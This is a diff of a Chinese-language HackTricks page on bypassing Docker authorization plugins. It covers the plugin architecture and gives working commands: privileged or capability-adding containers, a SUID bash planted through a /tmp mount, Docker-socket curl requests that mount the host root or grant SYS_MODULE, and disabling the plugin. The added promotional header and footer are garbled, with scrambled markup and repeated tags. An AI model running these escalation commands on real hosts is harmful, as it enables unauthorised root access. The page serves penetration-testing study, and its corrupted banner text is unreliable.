@@ -1,83 +1,88 @@
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<dotsilp>
 
-支持HackTricks的其他方式：
+<oummpr>SupportHackTricks</smmay>
 
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
-**Docker**的**授权**模型是**全有或全无**的。任何具有访问Docker守护程序权限的用户都可以**运行任何**Docker客户端**命令**。对于使用Docker的Engine API联系守护程序的调用方也是如此。如果您需要**更精细的访问控制**，可以创建**授权插件**并将其添加到Docker守护程序配置中。使用授权插件，Docker管理员可以为管理对Docker守护程序的访问配置**细粒度访问**策略。
+**Docker** 的开箱即用 **授权** 模型是 **全有或全无**。任何有权限访问 Docker 守护进程的用户都可以 **运行任何** Docker 客户端 **命令**。使用 Docker 的引擎 API 联系守护进程的调用者也是如此。如果您需要 **更严格的访问控制**，可以创建 **授权插件** 并将其添加到 Docker 守护进程配置中。使用授权插件，Docker 管理员可以 **配置细粒度访问** 策略来管理对 Docker 守护进程的访问。
 
 # 基本架构
 
-Docker Auth插件是您可以使用的**外部插件**，用于根据请求守护程序的**用户**和**请求的操作**来**允许/拒绝**发送到Docker守护程序的**操作**。
+Docker Auth 插件是 **外部** **插件**，您可以使用它们来 **允许/拒绝** 请求到 Docker 守护进程的 **操作**，具体取决于请求的 **用户** 和 **请求的操作**。
 
 **[以下信息来自文档](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-当通过CLI或通过Engine API向Docker **守护程序**发出**HTTP请求**时，**身份验证子系统**将请求传递给已安装的**身份验证插件**。请求包含用户（调用方）和命令上下文。**插件**负责决定是否**允许**或**拒绝**请求。
+当通过 CLI 或引擎 API 向 Docker **守护进程** 发出 **HTTP** **请求** 时，**身份验证** **子系统** 会将请求传递给已安装的 **身份验证** **插件**。请求包含用户（调用者）和命令上下文。**插件** 负责决定是否 **允许** 或 **拒绝** 请求。
 
-下面的序列图描述了允许和拒绝授权流程：
+下面的序列图描绘了允许和拒绝的授权流程：
 
-![授权允许流程](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![授权拒绝流程](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-发送到插件的每个请求**包括经过身份验证的用户、HTTP头和请求/响应正文**。只传递**用户名**和**使用的身份验证方法**给插件。最重要的是，**不会传递用户凭据或令牌**。最后，**并非所有请求/响应正文都会发送**到授权插件。只有`Content-Type`为`text/*`或`application/json`的请求/响应正文会被发送。
+每个发送到插件的请求 **包括经过身份验证的用户、HTTP 头和请求/响应体**。只有 **用户名** 和 **使用的身份验证方法** 被传递给插件。最重要的是，**不** 会传递用户 **凭据** 或令牌。最后，**并非所有请求/响应体都发送** 到授权插件。只有那些 `Content-Type` 为 `text/*` 或 `application/json` 的请求/响应体会被发送。
 
-对于可能劫持HTTP连接的命令（如`exec`）等命令，授权插件仅在初始HTTP请求时调用。一旦插件批准命令，授权就不会应用于其余流程。具体来说，流式数据不会传递给授权插件。对于返回分块HTTP响应的命令，如`logs`和`events`，只有HTTP请求会发送到授权插件。
+对于可能劫持 HTTP 连接的命令（`HTTP Upgrade`），例如 `exec`，授权插件仅在初始 HTTP 请求时被调用。一旦插件批准命令，后续流程不再应用授权。具体来说，流数据不会传递给授权插件。对于返回分块 HTTP 响应的命令，例如 `logs` 和 `events`，仅 HTTP 请求会发送到授权插件。
 
-在请求/响应处理期间，某些授权流可能需要对Docker守护程序进行额外查询。为了完成这样的流程，插件可以调用类似于常规用户的守护程序API。为了启用这些额外查询，插件必须提供管理员配置适当的身份验证和安全策略的手段。
+在请求/响应处理过程中，一些授权流程可能需要对 Docker 守护进程进行额外查询。为了完成这些流程，插件可以像普通用户一样调用守护进程 API。为了启用这些额外查询，插件必须提供管理员配置适当身份验证和安全策略的手段。
 
 ## 多个插件
 
-您负责在Docker守护程序**启动**时**注册**您的**插件**。您可以安装**多个插件并将它们链接在一起**。此链可以排序。每个传递到守护程序的请求都会按顺序通过链。只有当**所有插件都授予对资源的访问权限**时，访问权限才会被授予。
+您负责将 **插件** 注册为 Docker 守护进程 **启动** 的一部分。您可以安装 **多个插件并将它们链接在一起**。此链可以是有序的。每个对守护进程的请求按顺序通过链。只有当 **所有插件都授予访问权限** 时，访问才会被授予。
 
 # 插件示例
 
 ## Twistlock AuthZ Broker
 
-插件[**authz**](https://github.com/twistlock/authz)允许您创建一个简单的**JSON**文件，插件将**读取**以授权请求。因此，它为您提供了很容易控制哪些API端点可以被每个用户访问的机会。
+插件 [**authz**](https://github.com/twistlock/authz) 允许您创建一个简单的 **JSON** 文件，插件将 **读取** 该文件以授权请求。因此，它为您提供了非常简单的机会来控制每个用户可以访问哪些 API 端点。
 
-这是一个示例，允许Alice和Bob创建新容器：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+这是一个示例，允许 Alice 和 Bob 创建新容器：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-在页面[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go)中，您可以找到请求的URL与操作之间的关系。在页面[types.go](https://github.com/twistlock/authz/blob/master/core/types.go)中，您可以找到操作名称与操作之间的关系
+在页面 [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) 中，您可以找到请求的 URL 与操作之间的关系。在页面 [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) 中，您可以找到操作名称与操作之间的关系。
 
 ## 简单插件教程
 
-您可以在这里找到一个**易于理解的插件**，其中包含有关安装和调试的详细信息：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
+您可以在这里找到一个 **易于理解的插件**，其中包含有关安装和调试的详细信息：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
-阅读`README`和`plugin.go`代码以了解其工作原理。
+阅读 `README` 和 `plugin.go` 代码以了解其工作原理。
 
-# Docker授权插件绕过
+# Docker Auth 插件绕过
 
 ## 枚举访问
 
-要检查的主要内容是**允许的端点**和**允许的HostConfig值**。
+主要检查的内容是 **允许哪些端点** 和 **允许哪些 HostConfig 的值**。
 
-要执行此枚举，您可以使用工具[**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**。**
+要执行此枚举，您可以 **使用工具** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-## 禁止`run --privileged`
+## 不允许的 `run --privileged`
 
-### 最低权限
+### 最小权限
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
-### 运行容器然后获取特权会话
+### 运行容器并获得特权会话
 
-在这种情况下，系统管理员**禁止用户挂载卷并使用`--privileged`标志运行容器**或为容器提供任何额外的功能：
+在这种情况下，系统管理员**不允许用户挂载卷并使用 `--privileged` 标志运行容器**或给容器提供任何额外的能力：
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-然而，用户可以**在运行的容器内创建一个 shell 并赋予它额外的权限**：
+然而，用户可以**在运行中的容器内创建一个 shell 并赋予其额外的权限**：
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -89,11 +94,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-现在，用户可以使用任何[**先前讨论过的技术**](./#privileged-flag)来逃离容器，并在主机内**提升权限**。
+现在，用户可以使用任何[**之前讨论过的技术**](./#privileged-flag)从容器中逃逸，并在主机内部**提升权限**。
 
 ## 挂载可写文件夹
 
-在这种情况下，系统管理员**禁止用户使用`--privileged`标志运行容器**或为容器提供任何额外的功能，只允许挂载`/tmp`文件夹：
+在这种情况下，系统管理员**不允许用户使用 `--privileged` 标志运行容器**或给予容器任何额外的能力，他只允许挂载 `/tmp` 文件夹：
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -103,25 +108,25 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 {% hint style="info" %}
-请注意，您可能无法挂载文件夹 `/tmp`，但可以挂载**其他可写文件夹**。您可以使用以下命令查找可写目录：`find / -writable -type d 2>/dev/null`
+注意，您可能无法挂载文件夹 `/tmp`，但您可以挂载一个 **不同的可写文件夹**。您可以使用以下命令查找可写目录：`find / -writable -type d 2>/dev/null`
 
-**请注意，并非 Linux 机器上的所有目录都支持 suid 位！** 为了检查哪些目录支持 suid 位，请运行 `mount | grep -v "nosuid"`。例如，通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup` 和 `/var/lib/lxcfs` 不支持 suid 位。
+**注意，并非所有 Linux 机器中的目录都支持 suid 位！** 要检查哪些目录支持 suid 位，请运行 `mount | grep -v "nosuid"`。例如，通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup` 和 `/var/lib/lxcfs` 不支持 suid 位。
 
-还要注意，如果您可以**挂载 `/etc`** 或包含配置文件的任何其他文件夹，您可以在 docker 容器中以 root 身份更改它们，以便**在主机中滥用它们**并提升权限（也许修改 `/etc/shadow`）
+还要注意，如果您可以 **挂载 `/etc`** 或任何其他 **包含配置文件** 的文件夹，您可以在 docker 容器中以 root 身份更改它们，以便 **在主机中滥用它们** 并提升权限（可能修改 `/etc/shadow`）。
 {% endhint %}
 
-## 未经检查的 API 端点
+## 未检查的 API 端点
 
-配置此插件的系统管理员的责任是控制每个用户可以执行哪些操作以及具有哪些特权。因此，如果管理员采用**黑名单**方法处理端点和属性，可能会**忘记一些**可能允许攻击者**提升权限**的端点。
+配置此插件的系统管理员的责任是控制每个用户可以执行的操作及其权限。因此，如果管理员对端点和属性采取 **黑名单** 方法，他可能会 **忘记其中一些**，这可能允许攻击者 **提升权限**。
 
-您可以在 [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) 中查看 docker API。
+您可以在 [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) 检查 docker API。
 
-## 未经检查的 JSON 结构
+## 未检查的 JSON 结构
 
-### 在根目录中绑定
+### 在根目录中的绑定
 
-当系统管理员配置 docker 防火墙时，可能**忘记了**[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)的一些重要参数，比如 "**Binds**"。\
-在以下示例中，可以利用此配置错误创建和运行一个容器，该容器挂载主机的根目录 (/)：
+当系统管理员配置 docker 防火墙时，他可能 **忘记了一些重要参数**，例如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Binds**"。\
+在以下示例中，可以利用此错误配置创建并运行一个挂载主机根目录（/）的容器：
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -132,30 +137,30 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 {% hint style="warning" %}
-请注意，在此示例中，我们将**`Binds`**参数作为JSON中的根级键使用，但在API中，它出现在**`HostConfig`**键下面。
+注意在这个例子中，我们将 **`Binds`** 参数作为 JSON 的根级键使用，但在 API 中它出现在 **`HostConfig`** 键下。
 {% endhint %}
 
-### HostConfig中的Binds
+### HostConfig 中的 Binds
 
-按照**根目录中的Binds**的相同指示，执行以下**请求**到Docker API：
+按照与 **根中的 Binds** 相同的指示，向 Docker API 执行此 **请求**：
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-### 在根目录中挂载
+### Mounts in root
 
-按照与**在根目录中绑定**相同的说明，执行以下**请求**到Docker API：
+按照与 **Binds in root** 相同的指示，向 Docker API 执行此 **request**：
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-### HostConfig中的挂载
+### Mounts in HostConfig
 
-按照与**根目录中的绑定**相同的说明，执行以下对Docker API的**请求**：
+按照与 **Binds in root** 相同的指示，向 Docker API 执行此 **请求**：
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-## 未经检查的 JSON 属性
+## 未检查的 JSON 属性
 
-当系统管理员配置 Docker 防火墙时，有可能**忘记了某些参数的重要属性**，比如[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)中的 "**Capabilities**" 在 "**HostConfig**" 内部。在下面的示例中，可以利用这个配置错误来创建并运行一个具有 **SYS\_MODULE** 能力的容器：
+可能在系统管理员配置 docker 防火墙时，他 **忘记了一些参数的重要属性**，例如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Capabilities**" 在 "**HostConfig**" 内。以下示例中，可以利用此错误配置创建并运行具有 **SYS\_MODULE** 能力的容器：
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -166,12 +171,12 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 {% hint style="info" %}
-**`HostConfig`**通常包含从容器中逃脱的**有趣** **特权**的关键。然而，正如我们之前讨论过的，注意如何在其外部使用Binds也可以起作用，并且可能允许您绕过限制。
+**`HostConfig`** 通常是包含 **有趣** **权限** 的关键，可以用来逃离容器。然而，正如我们之前讨论的，注意在外部使用 Binds 也有效，并可能允许你绕过限制。
 {% endhint %}
 
 ## 禁用插件
 
-如果**系统管理员**忘记**禁止**禁用**插件**的能力，您可以利用这一点完全禁用它！
+如果 **系统管理员** **忘记** **禁止** 禁用 **插件** 的能力，你可以利用这一点来完全禁用它！
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -183,14 +188,32 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-## Docker访问授权插件认证和授权
+记得在提升权限后**重新启用插件**，否则**docker服务的重启将无效**！
 
-记得在提升权限后**重新启用插件**，否则**重启docker服务不会生效**！
-
-## Auth插件绕过攻略
+## Auth Plugin Bypass 文章
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
 ## 参考资料
+{% hnt stye="acceas" %}
+AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
+Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
 
-* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
+<dtil>
+
+<ummr>SupportHackTricks</smmay>
+
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
+* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
